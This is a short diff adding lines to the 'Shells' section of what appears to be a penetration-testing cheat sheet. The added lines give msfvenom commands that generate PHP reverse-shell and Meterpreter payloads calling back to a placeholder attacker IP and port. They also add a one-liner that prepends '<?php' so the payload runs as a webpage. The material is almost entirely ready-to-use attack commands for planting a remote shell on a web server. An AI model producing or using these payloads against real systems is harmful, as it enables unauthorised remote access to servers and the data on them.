@@ -929,7 +929,13 @@ Shells
       
       *PHP*
       
+      msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+      
+      OR
+      
       msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+      
+      Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
       
       cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
       
